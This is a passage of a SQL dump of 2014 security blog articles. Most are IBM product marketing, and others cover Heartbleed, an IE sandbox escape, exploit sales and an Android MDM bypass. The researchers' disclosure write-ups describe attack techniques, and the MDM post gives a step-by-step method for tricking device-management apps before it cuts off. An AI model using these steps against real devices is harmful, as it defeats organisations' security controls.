an additional burden on the development of the site. A bare-bones open redirect requires about five minutes to develop, a closed redirect with minimal thought requires 10. If you can’t slip that in the cracks of a development schedule, you’re not trying hard enough.', '\'Authentication\', \'Authentication Systems\', \'Identity and Access Management (IAM)\', \'OAuth\'', 'https://securityintelligence.com/oauth-openid-covert-redirect-security-flaw-weakness-analysis/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (531, '3 Advanced Threat Protection Essentials', 'Paul Kaspian', '2014-5-6', 'What is your protection strategy against targeted attacks, advanced persistent threats (APTs), advanced malware, unknown malware, zero-day threats and the like? The sophistication, complexity and frequency of this cyber activity can be overwhelming and are highlighted when they receive significant press recently with revelations regarding   or long lists of data breaches exposing  . In fact, 61% of organizations say data theft and cyber crime are the greatest threats to their reputation; and the costs of those breaches continue to rise. According to the Ponemon Institute’s 2014 U.S. Cost of Data Breach study, the organizational cost of data breaches has increased from  . The reality is that securing an enterprise today is much tougher than it was ten or even five years ago. We have an ever-increasing attack surface, extremely motivated and well-trained and well-funded criminals targeting organizations with custom tools and a slew of new technologies that make securing the modern enterprise exponentially more difficult. This has made traditional approaches, such as defending the perimeter, only one of many techniques needed to address today’s complex security landscape. This is also the reason that any point vendor claim to block advanced persistent threats or stop targeted attacks is not accurate as multi-faceted attacks cannot be prevented by a single control point–these types of attacks require a coordinated strategy. And I do hear in meetings with clients that more of them are recognizing they must evolve their approach, but they struggle with the question of how. To put it into perspective, the worldwide IT security products market is forecast to reach $42 billion by 2017 (IDC); yet we seem to be making little progress in significantly staying ahead of the next new threat despite increased spending, resources and focus by many organizations on security. Even organizations that have the budget, resources and expertise necessary are struggling to manage, update and understand the growing list of point solutions they have invested in. A typical reaction to security concerns has been organizations responding by deploying a new tool to address each new risk. I spoke to a government client recently that had 145 products to manage their security environment. That alone is a security problem, not to mention the level of complexity to manage since they now have to install, configure, manage, patch, upgrade and pay for dozens of poorly integrated solutions with limited views of the landscape. Clearly the process of continually adding new point solutions is not sustainable, and in many cases, its effect is the opposite of its intention: It makes clients less secure and creates the ever-increasing problem of “security sprawl.” Costly and complex, these fragmented security capabilities do not provide the visibility and coordination necessary to stop sophisticated attacks. It is time to realize that security approaches that rely on poorly integrated subcomponents are failing to protect against these new classes of advanced attacks. Just as it is not enough to continue to rely on point solutions to help solve this issue, simply focusing on a single point in the attack chain — such as the initial break-in or detecting a successfully penetrated network — is insufficient. It’s time to take a step back, understand the totality of these attacks and initiate action. This means: And it is critical to be able to act quickly in the event that a serious incident or breach is detected. In order to have the highest levels of  , your organization must be able to do these three essential things very effectively: This brings me to some exciting news: We are now announcing an initiative that has been in the works for several years here at IBM. It started with the formation of the   division, which unified IBM’s extensive security offerings under a single umbrella. We then went to work identifying key integration points with the intention of building on the power of the IBM Security  , an offering that integrates disparate technologies and their respective data sets to distill the “noise” down to a focused number of actionable offenses. Last year, we also introduced a new intrusion prevention platform with   (XGS). These appliances detect and block a wide range of attacks, are able to disrupt targeted attacks such as spear phishing and have a unique ability to send network flow data into QRadar, providing yet another data feed. Subsequently, we  , which does an excellent job of preventing malware installation on the endpoint and breaking communication from the malware back to command and control centerss Combined with integrating the Trusteer security research team into our own   and Development team, we went to work creating an advanced threat protection system that would bring these solutions together to bridge the gap presented by today’s siloed point solutions and give you a fighting chance of countering advanced and targeted attacks on your enterprise.We are pleased to announce the  , a culmination of all of this effort that provides you with the unique ability to  ,   and   to advanced threats in a continuous and timely fashion. As part of the announcement, IBM has also announced five new product releases as well as an extended partner ecosystem to ensure IBM’s Threat Protection System is an open platform that easily integrates with security solutions from other leading vendors such as  ,   and   to name a few. As threats continue to evolve and become more sophisticated, IBM is committed to helping our clients stay one step ahead. The IBM Threat Protection System is only the start as IBM security researchers, developers and security analysts focus on the next innovation to help keep our clients safe now and into the future.', '\'Advanced Malware\', \'Advanced Threat Protection\', \'Advanced Threats\', \'Data Breach\', \'IBM Security\', \'IBM Security QRadar\', \'IBM Security QRadar Security Intelligence Platform\', \'IBM Security QRadar Vulnerability Manager\', \'IBM X-Force Report\', \'Intrusion Prevention System (IPS)\', \'Network IPS\', \'Security Breach\', \'Security Intelligence\', \'Trusteer\', \'Trusteer Apex\'', 'https://securityintelligence.com/3-essentials-advanced-threat-protection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (532, 'An Intelligent Approach to Stopping Advanced Threats', 'Brendan Hannigan', '2014-5-5', 'As you’re reading this article and touching your mouse or mobile phone, a complex network of specialized cells inside your body is hard at work protecting you from infection-causing organisms such as bacteria and viruses. In simple terms, I’m describing your immune system, a remarkable collection of layered defenses. Skin provides a physical barrier to block and expel foreign organisms; a second line of protection detects and eliminates invaders with a cellular counterattack; and if unsuccessful, a third layer of tailored responses or antibodies quickly eliminate the threat based on intelligence from earlier infections. In order for this system to work successfully — protecting you from sickness or disease — immune cells must not only communicate, but also cooperate effectively. Individual defenses are no match for advanced diseases, but taken as a whole, you have an amazing protection system enabling your body to operate as intended. Why the lesson in biology? With the  , we are going after the same level of end-to-end, coordinated defenses — in this case, with technology to limit the success of cyber attacks. The IBM Threat Protection System is the result of a laser-focused effort two years in the making, bringing together innovative security capabilities to prevent, detect and respond to advanced threats in a continuous and coordinated fashion. It’s designed to help disrupt the entire life cycle of an attack — from the initial break-in to the final exfiltration of   — with preemptive defenses, powerful analytics and open integrations. This is the level of protection required to stop today’s extremely motivated and well-trained attackers. Up to now, many organizations have responded to security concerns by deploying separate new tools to address each new risk, and the heightened awareness caused by   has only intensified this trend. I spoke to a government client recently that has 85 different security products across their environment. That alone is a security problem, not to mention the level of complexity as they try to make sense of dozens of disconnected solutions with limited views of the threat landscape. Adding more and more point solutions is unsustainable and, in many cases, has the opposite effect of what was intended. We call this “security sprawl,” and the IBM approach is designed to help drive this complexity down over time. At the same time, organizations must also evolve their defenses to deal with  . To help our customers build an effective advanced threat protection strategy, the IBM Threat Protection System delivers unique capabilities in three integrated layers of defense: To help our customers combine the power of numerous new and existing security investments, we have also expanded our highly successful “ ” with new open integrations for real-time intelligence sharing with the   product. We are initially working with partners including  ,  , and   to share real-time threat indicators for immediate quarantine and blocking of advanced attacks. This further complements the hundreds of existing integrations we’ve built across the security community — including solutions from the partners mentioned above — with QRadar and other IBM Security products. Finally, the IBM Threat Protection System is built on an extensive global threat intelligence network driven by our   team and recently enhanced with incredible Trusteer intelligence on advanced malware and cyber crime campaigns. This means QRadar and XGS customers can now take advantage of Trusteer insights on malware, leveraging an installed base of more than 100 million endpoints. Like any evolving system, the   is comprised of new and existing capabilities; in fact, customers are taking advantage of its components today. With this announcement, we are introducing a new, coordinated approach optimized specifically to address advanced threats. Furthermore, this launch represents a rigorous series of efforts within IBM to deliver the innovative defenses, analytics and integrations making it all possible. We are committed to continue this journey along with our customers and partners. The introduction of the IBM Threat Protection System is a decisive step along that path.', '\'Advanced Attacks\', \'Advanced Malware\', \'Advanced Threat Protection\', \'Advanced Threats\', \'Data Breach\', \'IBM Security\', \'IBM Security QRadar\', \'IBM Security QRadar Security Intelligence Platform\', \'IBM X-Force Research\', \'Intrusion Prevention System (IPS)\', \'Malware\', \'Network IPS\', \'Security Breach\', \'Security Intelligence\', \'Trusteer\', \'Trusteer Apex\'', 'https://securityintelligence.com/advanced-threat-protection/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (533, 'Underground Cybercrime: Exploits for Sale', 'Dana Tamir', '2014-4-25', 'The Russian cybercrime underground provides a wide range of tools for amateur and professional hackers, enabling them to leverage the latest application vulnerabilities to target their victims. In order to exploit vulnerabilities in applications and use them to   and compromise user endpoints, you don’t have to be a genius or have years of hacking expertise. It’s all available for sale.  has recently identified a new offering from a Russian cybercrime forum member: An exploit that is successful 95 percent of the time, according to the seller, which might be related to the stability of the exploit implementation. According to the post, which appeared on a Russian cybercrime forum, the new exploit targets an Adobe Flash Player vulnerability (CVE_2014_0497). Adobe provided a critical patch for this vulnerability on Feb. 4 after an exploit targeting this vulnerability was already seen in the wild. By exploiting this vulnerability, an attacker can execute arbitrary code and potentially gain remote control of the affected system. The seller, who calls himself “insomnius,” writes that the exploit is 95 percent successful on   and  . His post, translated from the original Russian, read: “I am selling source code CVE-2014-0497, it is working ~95 percent on IE and FF. All information about current exploit is in the first post.” Unfortunately, the seller went dark after posting this message so we were unable to get further details about the offer. It could be because exploits targeting this vulnerability have already been included in exploit kits, thus making them highly accessible; likewise, it could also be because the exploit had already been sold to someone else. You are probably wondering,  The sad reality is that many user endpoints are not properly patched. IT groups struggle to ensure that patches are deployed on all machines, especially those that travel in and out of the organization. Worse, the applications that are most difficult to patch are common applications like Java, Adobe Acrobat and Flash, which can be found on most user endpoints. Other common applications like Microsoft Word, Excel, Outlook, browsers and even media players all have vulnerabilities that can be exploited. Because it is so difficult to manage patches for all the different applications and versions running within the enterprise, many user machines remain vulnerable. The reality is that 60 percent of the exploits target vulnerabilities that have  . The worst are zero-day exploits, which target vulnerabilities that are not publicly known. Since they are unknown, there is no patch available to prevent exploitation. Therefore, zero-day exploits have very high success rate and are very valuable in the underground.', '\'Advanced Persistent Threat (APT)\', \'Firefox\', \'Internet Explorer (IE)\', \'Targeted Attacks\', \'Trusteer\', \'Vulnerabilities\'', 'https://securityintelligence.com/underground-cybercrime-exploits-for-sale/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (534, 'The State of the Hack and Cyber Threat Intelligence Gain/Loss', 'Zubair Ashraf', '2014-4-15', '“ ” was my first post in the series of cyber threat intelligence keynote recaps. There you will find an introduction to the series and the motivation behind it. This month, I would like to recap Kevin Mandia’s keynote at RSA 2014, “ “; and while we’re at it, we will also take a look at a related talk, “ ,” by Dmitri Alperovitch ( ) and George Kurtz ( ). Let’s first take a look at the reasons companies should or should not disclose cyber threat intelligence. Clearly, when you disclose the intelligence that you have gathered about an adversary, it alerts them and forces them to abandon their command and control (C&C) infrastructure. You may also lose sight of the adversary for some time until they come back with new attack tools and C&C infrastructure. This is not to mention that you may cause collateral damage to others who are compromised as part of the new C&C infrastructure; but perhaps they were already compromised — or would have been compromised — regardless of the circumstances. Thus, one may wonder why companies such as Mandiant and Crowdstrike release their intelligence to the public. Let’s start with the reasons that Mandia mentioned in his keynote: Here are a few points explaining why Crowdstrike went ahead with disclosing their cyber threat intelligence about adversaries, based on the   and a   ( ): Alright, now back to the keynote we are recapping and some other points that Mandia mentions: I thank Mandiant (then, and now FireEye) for doing a great job taking the lead in disclosing an adversary’s TTP, releasing thousands of actionable IOCs and providing sufficient background details. It was great to see Crowdstrike and others follow suit and share similar information. Moving forward, organizations should: Finally, on the diplomatic/policy side, we need to get back on the table, set up policies and then respect and abide by policies and law; and on this score, I leave you with an article titled “ ” by  .', '\'Advanced Persistent Threat (APT)\', \'IBM X-Force Research\', \'RSA Conference\'', 'https://securityintelligence.com/state-of-hack-cyber-threat-intelligence-kevin-mandia-mandiant-crowdstrike-fireeye/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (535, 'What You Need to Know to Survive Windows XP’s End-of-Life', 'Dana Tamir', '2014-4-14', 'After almost 13 years of  , Microsoft announced that the still-popular operating system (OS) has reached its  . This means that Microsoft will no longer provide patches to new vulnerabilities found in the OS. As a result, it is now impossible for users and organizations to address any new vulnerabilities; these vulnerabilities for which a patch does not exist are known as “ .” Since Microsoft will not provide any new patches for the Windows XP systems, new vulnerabilities will become perpetual zero-day vulnerabilities; the systems will essentially forever be vulnerable to zero-days. The threat goes beyond the OS vulnerabilities. Now that the OS isn’t supported, most software vendors will drop support for legacy applications running on the unsupported OS. After all, why would vendors bother to maintain a product for an OS that is, for all intents and purposes, dead? This increases the attack surface, exposing XP systems to additional exploits targeting vulnerabilities that can’t be patched.  are extremely valuable to cyber criminals, who can exploit these to compromise the user machine and infiltrate corporate networks. Zero-day vulnerabilities in software applications provide hackers and  . By exploiting these vulnerabilities, the attacker can alter the behavior of the application and use it to download malware on the system. Once the system has been compromised, it enables the attacker to gain access to information on the system itself and to access corporate assets and sensitive information stored on the network. Since no patch is available, it is almost impossible to defend against such exploits. It is very likely that attackers already knew of some zero-day vulnerabilities in Windows XP-based systems but were holding on to them until the EOL date to ensure that patches weren’t made available for these systems. Security researchers warn that we will soon experience an avalanche of new zero-days on these systems; and the implications will be colossal. Without patches to prevent their exploitation, the vulnerabilities become perpetual zero-days. According to Microsoft, a full operating system migration project can take up to six months, depending on an organization’s size. This results from a number of complex decisions and technical challenges with which the IT group is confronted. As a result of these challenges, some organizations have delayed the initiation of the migration process. Others that have already begun a migration may have encountered unexpected complexities or technical barriers that delayed Windows XP system migration beyond its EOL date. Those systems and the organizations that use them are therefore exposed to the risk of perpetual zero-days. Enterprises, now more than ever, need a   against advanced malware and preventing the exploitation of vulnerabilities for the purpose of end-point compromise. You need unique, in-depth controls that break the threat life cycle at strategic choke points. The bottom line is that you no longer can be dependent on patch availability or on advanced information about exploitable vulnerabilities or the malware that is used for compromising the end point. You need a more   after the EOL date.', '\'Advanced Threats\', \'Legacy Applications\', \'Malware\', \'Microsoft\', \'Trusteer\', \'Trusteer Apex\', \'Vulnerabilities\', \'Windows XP\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/windows-xp-end-of-life-eol-what-to-do/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (536, 'How Security Intelligence Helps Reduce the Impact of Heartbleed Vulnerability', 'Jason Keirstead', '2014-4-10', 'It would be difficult to find someone involved in the security industry today who has not heard about the  , first disclosed earlier this week. This flaw in  , which affects  , is one of the most serious publicly disclosed vulnerabilities in recent times, not only because of how common OpenSSL usage is, but also because of the scope of the vulnerability itself. Servers vulnerable to the Heartbleed buffer overflow expose their own raw memory contents to attackers, allowing someone to snoop in on all kinds of data, including user names, emails, passwords, addresses, Social Security numbers, companies’ confidential data — the sky’s the limit. Essentially, if it is data that has recently passed through OpenSSL memory buffers on the server, it is vulnerable to attackers. Furthermore, properly fixing the vulnerability is not even as simple as patching   itself because if the host has been exposed to attackers, one must also regenerate their security certificate, which may be compromised and can no longer be trusted. Generating and replacing certificates for all servers can be an extremely expensive and time-consuming procedure for companies that have many SSL end points. Likewise, these previously used (and assumed compromised) certificates also have to be revoked. There has been commentary that this vulnerability exposes a “ ,” one where proper monitoring, intelligence and incident response are just as important as strong firewall rules, which raises an important point: When responding to an incident like  , the solution is not usually as simple as pressing a button and having all machines in the enterprise patched and all new certificates generated and deployed. For most organizations, it will require lots of planning and effort. So the question arises:   Thankfully, IBM Security has you covered. Using the   suite of products, it is relatively straightforward to not only detect servers that are likely vulnerable to Heartbleed, but also to prioritize your remediation work flow, allowing you to target your most vulnerable and/or valuable assets first. \n The first step is identifying the machines and services that are vulnerable to Heartbleed.   scanner module, which processes nightly signature updates, will have the ability to detect hosts vulnerable to Heartbleed, also known as vulnerability  . It is important to note that you don’t have to rescan your assets to know if they are vulnerable; they just have to have been scanned in the past. Figuring out which hosts are vulnerable is very straightforward and can be done with a simple search. Now that we know which hosts are vulnerable, we need to decide which ones must be patched first. Is the host exposed to the Internet, or is it firewalled from the world? Is the host a piece of production infrastructure, or is it just a test machine? This is where   enters the picture, which, as one of its functions, allows you to write policies that influence the prioritization of vulnerabilities. These policies can take into account not only the host’s security posture, but also firewall and IPS rules, routing information and flow traffic. Here we have written a policy test if the server is in our production PCI network and also tests if inbound connections from the Internet can reach the host on the exposed port. The policy will then increase the risk of this vulnerability by a factor of 100 percent via the monitor mode and bring it to the top of our remediation list for patching. But we can go even further: As previously mentioned, servers that are vulnerable to Heartbleed and have been exposed to attackers in the past also need to regenerate and apply their certificates. This could be the most expensive process for the enterprise in this whole scenario, so we want to make sure that we prioritize this properly. Due to its  , IBM Security QRadar Vulnerability Manager has the additional ability to filter on hosts that have actual traffic on a port. If we want to know which hosts not only are susceptible to Heartbleed, but also have communicated on this port in the past, the software allows you to determine if a new certificate actually needs to be generated for this host or not. This search shows that none of the machines that have the vulnerability have communicated using this port in the past 120 days. Therefore, we can rest assured that the likelihood of them having a compromised SSL certificate is low, and we can move them to the bottom of the priority list for new certificates. As you can see, even with issues as severe and wide-reaching as Heartbleed, a proper application of security intelligence can not only reduce your exposure to the issue, but also save a lot of time and money while remediating. While we may not be able to predict when the next Heartbleed will be exposed, by using the right tools it is at least possible to create policies and procedures that can be used to reduce reaction times when these kinds of problems come to the fore.', '\'Firewall\', \'Heartbleed\', \'IBM Security QRadar\', \'Risk Manager\', \'Secure Sockets Layer (SSL)\', \'Security Information and Event Management (SIEM)\', \'Security Intelligence\', \'Technical & Product\', \'vulnerability manager\'', 'https://securityintelligence.com/heartbleed-vulnerability-security-intelligence-tool/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (537, 'What to Do to Protect against Heartbleed OpenSSL Vulnerability', 'Chris Poulin', '2014-4-10', 'An old IT expression goes, “What sounds like a really good idea at 5 p.m. becomes a really bad one by midnight.” This usually refers to making a quick change to a system before you go home on a Friday evening that inevitably goes wrong, forcing you to pull an all-nighter getting the system back to a stable state. This appears to have been the case with an   check-in to include TLS/DTLS heartbeats at  , which eventually led to the vulnerability we’re now calling  .\n More than half of web servers on the internet use OpenSSL to safeguard data and user accounts. Versions 1.0.1 through 1.0.1f are vulnerable to an exploit that may expose user credentials, credit card data, sensitive documents and the server’s certificate itself. Below is an explanation of what the vulnerability is, how it manifests itself and how you can protect yourself from being compromised.\n  is a form of encryption generally used by Web servers to secure transactions such as credit card payments. It also protects login credentials — your username and password — from being exposed across the Internet.  , also known as  , can be identified in your browser by “https://” (the “s” is for secure) versus “http://” in the website address bar. Most browsers will also show some form of lock icon in the address bar as well to show that the connection is secure.\n To set up the encrypted session, TLS must agree upon an encryption method that’s supported by both the Web server (e.g.,  ) and the client (usually your web browser) as well as exchange encryption keys to secure the session. This is known as the TLS handshake, Generating and validating encryption keys can delay access to the website and consume computing power.   are sent when there’s no activity — when a user is filling in a Web form, for example — to keep the session from timing out and having to renegotiate the session.\n TLS heartbeats are like a network ping: The sender transmits a request with an arbitrary payload and expects the receiver to respond, including the original payload in the response. There’s no need to include anything in the payload — a zero byte payload is acceptable — but there’s nothing to prevent one from being included. The payload can be up to 64 KB in size, or 65,535 bytes, the size of which is specified by the sender in in a field called “length,” which preceded the payload itself.\n The problem is that OpenSSL blindly trusts the length field set by the sender when it creates a response packet. First the server receiving the request stores a copy of the request on the memory heap, including the original payload. Then it creates a response packet and copies the payload from the original request, starting at the location it stored it on the heap and continuing for the specified length. In our example diagram below, the sender sent 3 bytes of the original payload data, the string “abc,” but claimed it sent 30,000 bytes, which extends past the original payload and deep into the heap. \n The heap may contain anything from random data to unencrypted data processed by OpenSSL. The latter generally includes the server’s SSL certificate private key and, in many cases, plain text usernames and passwords for users of Web services. The irony is that the system that gives users confidence that their Web session is secure is the very mechanism that betrays their account credentials.\n \n It’s not just typical Web services on the Internet that are affected: It could be any number of software packages or hardware devices that are affected. OpenSSL is the most widely used TLS library. While enterprises should perform a comprehensive assessment of their assets, here are some pointers and notes:\n In order to test if you’re vulnerable and assess the potential damage, here are some steps to take:\n This is a widely accessible vulnerability since OpenSSL is used to secure Web-facing systems — and it’s easy to exploit.\n [Blog post updated 14 Apr 2014 at 9:31AM ET to clarify that it’s the SSL certificate private key, not the SSL certificate itself, which may be compromised by the Heartbleed attack.]', '\'Heartbleed\', \'Heartbleed OpenSSL Vulnerability\', \'IBM X-Force Research\', \'OpenSSL\', \'Vulnerabilities\'', 'https://securityintelligence.com/heartbleed-openssl-vulnerability-what-to-do-protect/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (538, 'A Peek into IE’s Enhanced Protected Mode Sandbox', 'Mark Yason', '2014-4-8', 'In October 2013 and March 2014, I had the opportunity to present my   at the   and the   security conferences. This blog post summarizes my findings, discusses the most important points and directs you to related resources in case you want to find out more about the subject. You can get the slides of my talk   and the whitepaper  . The whitepaper was also published in  . In 2006,   was introduced in   with the goals of preventing an attack from modifying data and of preventing installation of persistent malicious code in the system. Using the integrity mechanism introduced in Windows Vista, Protected Mode runs the sandboxed IE process at low integrity, which greatly limits what it can write to. Fast forward to 2012.   was introduced in  . One of the goals of EPM was to address a limitation of the original Protected Mode — namely, the ability of the sandboxed IE process to still read most resources that can lead to potentially sensitive or personal information being stolen. With EPM, the sandboxed IE process runs in an AppContainer, a process isolation mechanism introduced in Windows 8 that restricts both read and write access of a sandboxed process and also prevents the sandboxed process from performing certain operations. You can think of AppContainers as boxes in which applications run and that in turn limit what the applications can access and what operations they can perform. In addition to IE EPM, AppContainer is the sandboxing mechanism used by Windows Store Apps. AppContainers are explicitly given a set of   so that processes running in them can access a given set of resources and to allow them to perform a specific set of operations that are otherwise denied to AppContainer processes by default. By default, when visiting Internet and public network sites, the AppContainer in which IE runs is assigned the following capabilities:  ,  ,  ,  ,   and  . These capabilities, except for the   capability, are documented  . The illustration below shows the AppContainer in which the sandboxed IE process runs and the assigned capabilities: Among other things, the   capability ( ) is used by the sandboxed IE process to access browser-related resources located outside the AppContainer-specific locations (locations in the registry and file system that are readable/writable to processes running in a particular AppContainer for data storage). So how does EPM, with the use of AppContainer, help in preventing access to potentially sensitive or personal information? In my opinion, the following are two of the most important AppContainer features that do just that: In order for an AppContainer process to access securable objects, such as files and registry keys, the securable object needs to have an additional access control entry (ACE) for any of the following: The AppContainer — An example of resources that have an AppContainer ACE are the AppContainer-specific locations that need to be readable and writable to processes running in a particular AppContainer. The illustration below shows the access control list of IE’s AppContainer-specific folder. The highlighted entry is the IE AppContainer ACE that grants full access to processes running in IE’s AppContainer:  — This essentially means that any AppContainer process running in any AppContainer can access the resource. An example of resources that have an   ACE are common/system locations (e.g.   folder, subkeys of   etc.) that contain resources to which AppContainer processes need access in order to  . A capability that matches one of the AppContainer’s capabilities — An example of resources that have a capability ACE are browser-related resources that have an   capability ACE in order to allow access from processes running in IE’s AppContainer. The illustration below shows an   capability ACE in the “ ” folder: Because of this AppContainer feature, personal user files such as those stored in the user’s Documents, Pictures and Videos folder (i.e. ) will not be directly accessible to the sandboxed IE process because those folders do not have an access control entry for any of the above. Another AppContainer feature that helps EPM in preventing the sandboxed IE process from accessing resources that might be stored in trusted home and corporate networks is  . With network isolation, the AppContainer needs to have specific capabilities in order for an AppContainer process to connect to Internet and public network endpoints ( ), connect to and receive connections from Internet and public network endpoints ( ) and connect to and receive connections from private (trusted intranet) network endpoints ( ). By default, when visiting Internet and public network sites, IE’s AppContainer has only the   capability, which means that the sandboxed IE process can connect only to Internet and public network endpoints. Connections to private network endpoints such as those that are part of trusted home and corporate intranets are blocked. There are other restriction/isolation schemes provided by AppContainer that further help in sandboxing AppContainer processes, some of which are described in my talk. But since the internals of AppContainer are still largely undocumented/unexplored, there are certainly more AppContainer restriction/isolation schemes that need to be researched and documented, which makes AppContainer an interesting research topic. After understanding the EPM restrictions in place, two important questions need to be answered: Is there any other potentially sensitive or personal information that a malicious code running in the EPM sandbox can still access? And can a malicious code running in the EPM sandbox still perform some malicious activities (e.g., phoning home, screen scraping etc.) while inside the EPM sandbox? The answer to both questions is “Yes.” My talk described the limitations/weaknesses that I observed, and here are some that are worth noting: There are user-specific locations such as a few folders under the   folder and some subkeys under   that can still be accessed by the sandboxed IE process. Resources in these locations will likely contain potentially sensitive or personal information owned by a specific user. Examples of potentially sensitive files that can be directly accessed by code running in the EPM sandbox process are the EPM cache files and EPM cookies because they are stored under the AppContainer-specific folder ( ), so accessing them does not require mediation from the higher-privileged broker process. Additionally, some registry keys and folders containing potentially sensitive or personal information are also accessible to code running in the EPM sandbox either due to the   ACE or the   capability ACE. Examples of these are: Compared to other sandbox implementations, such as the  , there are still well-known restriction or isolation mechanisms that EPM does not apply. Examples of these unapplied restriction/isolation mechanisms are restricted tokens, job object restrictions, window station isolation and desktop isolation. Without these restriction/isolation mechanisms in place, attacks such as screen scraping, screen capture and stealing/modifying of the clipboard contents are still possible. Finally, IE’s AppContainer has the   capability, which means that malicious code running in the EPM sandbox will still be able to connect to Internet and public network endpoints, which in turn allows a sandboxed malicious code to phone home or send any stolen information to a remote attacker. As mentioned in my talk, the most likely reason for the existence of some of these limitations/weaknesses is either compatibility issues or that addressing them would require significant development effort. The fun part of every sandbox research effort is when you are analyzing and documenting a sandbox implementation and finding sandbox escape bugs along the way. In my talk, I demonstrated a sandbox escape leveraging CVE-2013-4015, a bug I found while looking at the EPM sandbox. But before discussing the bug, let me first enumerate the most likely ways a code will escape the EPM sandbox: This involves exploiting local EoPs, especially those that result in arbitrary code execution in the kernel. A recent   is when attackers used an NDProxy vulnerability (CVE-2013-5065) to escape the Adobe Reader sandbox. Another example is when Jon Butler and Nils used a Win32k vulnerability (CVE-2013-1300) to escape the Google Chrome sandbox in Pwn2Own 2013. This involves taking advantage of permissive sandbox policies or resource permissions (such as permissive ACLs) in order to control the behavior of a higher-privileged process. An   is the IE   vulnerability (CVE-2013-3186) discovered by Fermin Serna that allowed the execution of arbitrary scripts in medium integrity because a program with a default “run in medium without prompt” elevation policy can be passed a particular argument to run a user-controlled script. This involves finding ways to evade the policy checking logic. An   is the vulnerability (CVE-2011-1353) that my colleague Paul Sabanal and I discovered (also independently discovered by Zhenhua Liu) in the policy engine of the Adobe Reader sandbox. The vulnerability allowed the evasion of a registry policy check via the use of additional backslashes in a registry resource name; the vulnerability could in turn be used by an attack to disable the Adobe Reader sandbox by modifying a critical sandbox configuration entry in the registry. This involves exploiting vulnerabilities in the services exposed by the higher-privileged broker process. A notable   is the buffer overflow vulnerability (CVE-2013-0641) in an Adobe Reader sandbox broker service that was used by an attack to escape the Adobe Reader sandbox. Going back to the discussion of CVE-2013-4015, the bug is an example of a policy check vulnerability that allowed execution of any executable in medium integrity without prompt. By delimiting an application name and arguments with a tab character instead of a space, the vulnerable function ( ) used by the broker will be misled to extract an incorrect application name from a command line. Consider the following command line: \n In the above case, the vulnerable function will treat the string “ ” (normalized to “ “) as the application name and the string “ ” as the argument. Because of a default elevation policy, the executable “ ” is allowed to execute in medium integrity without prompt; thus, the application name will pass the elevation policy check. However, when the command line is passed to   by the broker,   will be executed instead! We immediately reported the bug to Microsoft. It was   in July 2013. Enhanced Protected Mode is a welcome incremental step done by Microsoft in improving IE’s sandbox. Its use of the new AppContainer process isolation mechanism will certainly help in preventing theft of personal user files and corporate assets from the network. However, there are still some limitations or weaknesses in the EPM sandbox that can lead to the exfiltration of some other types of potentially sensitive or personal information, and there are still some improvements that can be made to prevent the attacks that I described in my talk.', '\'IBM X-Force Research\', \'Internet Explorer (IE)\', \'Research\', \'Sandbox\'', 'https://securityintelligence.com/internet-explorer-ie-10-enhanced-protected-mode-epm-sandbox-research/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (539, 'How to Cheat Your MDM: Compliance without a Password', 'Zubair Ashraf', '2014-4-3', 'DID YOU KNOW? By 2016, 20% of enterprise BYOD programs will fail due to deployment of mobile device management (MDM) measures that are too restrictive. Recently, I came across a bug in Android’s Device Administrator code and questioning whether it can be classified as a security vulnerability and if/how it can be exploited. This resulted in the CVE-2014-0900. Below (as promised in my  ), I will share the vulnerability in Android OS code and describe how it can be exploited to give a false sense of control and authority to an affected MDM Android app. What this means is that the MDM app on your Android device would have a false sense that it can wipe data, lock the device, enforce password quality policies and so on and will therefore let you access corporate email, data or intranet resources while in reality it would have no such control and you can continue to use your device without any of the corporate restrictions. We know you did not like to type those long passwords and would rather have no password and no lock screen. After all, don’t you want to share your personal data with everyone? I have verified that two commercially used MDM solutions are affected by this. It is very likely that most MDM apps (if not all) are affected, too. Below, I will share the vulnerability and exploitation details. If you are not interested in technical details, you can jump to the end to read about the mitigation possibilities and lessons learned from this that will help you in your BYOD strategy as a solutions provider and as a buyer. If you are responsible for developing an MDM app, we recommend that you take a look under the section titled Mitigation to determine whether your product is affected by this and how to mitigate the risk.  For your personal safety and job security, we strongly discourage trying this on your BYOD-approved device. The vulnerability exists in private void handlePackagesChanged(int userHandle) methods of   for versions below android-4.4.1_r1. DevicePolicyManagerService class maintains two data structures to track the active device admins on a device: However, in handlePackagesChanged mAdminList is updated, but mAdminMap is not updated to remove the admin from the hash map. Interesting. Let’s see where in code mAdminMap is consulted but mAdminList is not. We find that getActiveAdminUncheckedLocked and getActiveAdminForCallerLocked(ComponentName who, int reqPolicy) with “who” parameter being non null relies on mAdminMap only, and getActiveAdminUncheckedLocked is used by  . So an MDM app that uses this isAdminActive method to check whether its   is active can potentially be deceived. Here is how: To demonstrate this, we will use Lookout’s free anti-virus as an example. Note that this is just for demonstration purposes since this is what I had on my phone. This is a benign bypass for demonstration/verification only, and this app is different from the commercial MDM solution from Lookout. The idea is that AV apps typically have features for extra protection (such as remote wiping of a device) if you allow them to enable their Device Administrator component. The AV app would check whether its device administrator is enabled and would show status on their dashboard. We will demonstrate how you can trick it into getting this wrong. The first step is to get hold of the apk package for Lookout anti-virus (hint: install on your phone, and get the apk using adb pull) and to extract the AndroidManifest.xml file. If you are not familiar with how to do this, you can find some hints in my earlier post,   . Look at the   file, and take note of two things: The package name for the app and the name of the   component. You can read up on the previously linked reference about DeviceAdministrator to learn how to create your own DeviceAdministrator. Go ahead and create an Android project with the same package name and same name for the DeviceAdministrator component as the one you are trying to deceive. The special thing you need to do with your DeviceAdministrator is to execute the following code once it is enabled as a device administrator on the device: I added this in the   method of my DeviceAdministrator. What this will do is   my DeviceAdministrator component after it has been given the rights of a DeviceAdministrator, resulting in the 